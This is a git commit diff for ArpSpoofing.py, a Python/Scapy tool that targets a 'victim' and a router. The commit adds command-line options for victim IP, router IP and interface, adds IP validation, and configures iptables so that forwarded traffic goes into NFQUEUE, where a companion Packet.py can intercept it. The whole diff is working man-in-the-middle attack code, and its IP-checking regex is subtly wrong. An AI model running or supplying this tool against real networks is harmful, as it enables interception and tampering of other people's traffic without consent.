50e78b77bba82ac037df85b9661cdf793780b833
Aidan Fray <afray@hotmail.co.uk>
2017-11-20 14:41:47 +0000

    Changes; -ARPSpoofing.py and Packet.py are now working together, the packets to be forwarded needed to be placed in the NFQueue. -ARPSpoofing.py has now been converted into a script -Regex for IP addresses has been added to ARPSpoofing.py

--- PacketCapture/ArpSpoofing.py
+++ PacketCapture/ArpSpoofing.py
@@ -1,12 +1,14 @@
 import os
 import sys
+import getopt
+import regex
 from scapy.all import *
 from scapy.layers.l2 import arping
 
 # General variables
-interface = input("Interface: \n")
-victimIP = input("Victim IP: \n")
-routerIP = input("Router IP: \n")
+interface = ""
+victimIP = ""
+routerIP = ""
 
 # Turns on or off scapy messages
 scapyVerbose = 0
@@ -27,22 +29,18 @@ def grab_MAC(IP):
 def grab_MAC_Addresses():
     """Method that grabs the victim and router MAC addresses and stores them"""
 
-    loop = True
-    while loop:
-        global victimMAC
-        global routerMAC
-        victimMAC = grab_MAC(victimIP)
-        routerMAC = grab_MAC(routerIP)
+    global victimMAC
+    global routerMAC
+    victimMAC = grab_MAC(victimIP)
+    routerMAC = grab_MAC(routerIP)
 
-        print("[!] MAC ADDRESS OBTAINED")
+    if victimMAC is not None and routerMAC is not None:
+        loop = False
+        print("[*] MAC Addresses obtain successfully!")
         print("[*] Router mac: \'", routerMAC, '\'')
         print("[*] Victim mac: \'", victimMAC, '\'')
-
-        if victimMAC is not None and routerMAC is not None:
-            loop = False
-            print("[*] MAC Addresses obtain successfully!")
-        else:
-            print("[!] Error obtaining MAC Addresses, trying again!")
+    else:
+        exit("[!] Error obtaining MAC Addresses, trying again!")
 
 
 def spoof(routerIP, victimIP):
@@ -71,17 +69,15 @@ def set_ip_forward(state):
     """Method used to configure the host packet forwarding"""
 
     if state is True:
-
         # This config has been tested only on Arch linux
         os.system("sysctl net.ipv4.ip_forward=1")
-        os.system("iptables -t nat -A POSTROUTING --out-interface {0} -j MASQUERADE".format(interface))
-        os.system("iptables -A FORWARD --match conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT")
-        os.system("iptables -A FORWARD --in-interface {0} --out-interface {0} -j ACCEPT".format(interface))
+
+        # Pushes the forwarded packets into the NFQUEUE so the Packet.py can take affect
+        os.system("iptables -A FORWARD  -j NFQUEUE")
 
     else:
         os.system("sysctl net.ipv4.ip_forward=0")
         os.system("iptables -F")
-        os.system("iptables -t nat -F")
 
 
 def run():
@@ -102,4 +98,68 @@ def run():
             sys.exit(0)
 
 
+def valid_ip(ip_address):
+    """This function uses regex to check if the IP address parameters are correct.
+    It validates the range 0.0.0.0 -> 255.255.255.255"""
+
+    # Regular expression pattern matching for IP addresses
+    pattern = \
+        "(((2[0-5][0-5])|(1[0-9][0-9])|([0-9][0-9])|([0-9]))\.){3}(((2[0-5][0-5])|(1[0-9][0-9])|([0-9][0-9])|([0-9])))"
+
+    # Pattern match
+    if not regex.match(pattern, ip_address):
+        print("[*] Error: Invalid IP please check your parameters!")
+        sys.exit(1)
+
+
+def parameters():
+    """Method deals with parameters passed into the script"""
+
+    global victimIP
+    global routerIP
+    global interface
+
+    opts, args = getopt.getopt(sys.argv[1:], 'i:v:r:h', '')
+    for opt, arg in opts:
+        try:
+            if opt == "-i":
+                interface = arg
+            elif opt == "-v":
+                victimIP = arg
+            elif opt == "-r":
+                routerIP = arg
+            elif opt == "-h":
+                usage()
+                sys.exit(0)
+        except getopt.GetoptError:
+            print("Error: incorrect parameters")
+            usage()
+            sys.exit(2)
+
+    # Validation
+    valid_ip(victimIP)
+    valid_ip(routerIP)
+
+    # Validation for parameter
+    if victimIP == "" or routerIP == "" or interface == "":
+        print("\nError: Invalid parameters passed, a routerIP, victimIP and interface need to be passed")
+        usage()
+        sys.exit(1)
+
+
+def usage():
+    """Issues a terminal help message"""
+
+    print("""
+        Options:
+        #=================================================#
+        | -h                             - Help           |
+        | -v <IP_Address>                - Victim IP      |
+        | -r <IP_Address>                - Router IP      |
+        | -i <Interface_name>            - Interface      |
+        #=================================================#
+        """)
+
+
+parameters()
 run()
